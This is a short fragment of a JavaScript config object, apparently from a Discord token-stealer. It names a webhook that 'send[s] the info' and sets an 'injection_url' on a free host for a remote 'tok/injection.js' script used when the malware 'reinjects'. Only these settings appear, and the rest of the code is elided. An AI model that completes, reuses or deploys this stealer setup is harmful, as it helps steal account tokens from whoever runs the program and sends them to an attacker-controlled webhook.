...
const config = {
  ...
  embed_name: 'Zitado Km ', //name of the webhook thats gonna send the info
  ...
  injection_url: 'https://zitadokm.000webhostapp.com/tok/injection.js', //injection url for when it reinjects
  /**
